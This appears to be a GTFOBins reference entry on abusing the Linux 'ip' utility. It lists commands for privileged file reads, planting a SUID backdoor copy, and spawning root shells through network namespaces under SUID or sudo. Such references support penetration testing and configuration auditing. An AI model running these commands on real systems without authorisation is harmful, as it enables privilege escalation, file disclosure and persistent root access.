# GTFOBin: ip

The read file content is corrupted by error prints.

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
ip -force -batch "$LFILE"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which ip) .

LFILE=file_to_read
./ip -force -batch "$LFILE"
```

This only works for Linux with CONFIG_NET_NS=y.

```
sudo install -m =xs $(which ip) .

./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_read
sudo ip -force -batch "$LFILE"
```

This only works for Linux with CONFIG_NET_NS=y.

```
sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo
```

This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.

```
sudo ip netns add foo
sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
sudo ip netns exec bar /bin/sh
sudo ip netns delete foo
sudo ip netns delete bar
```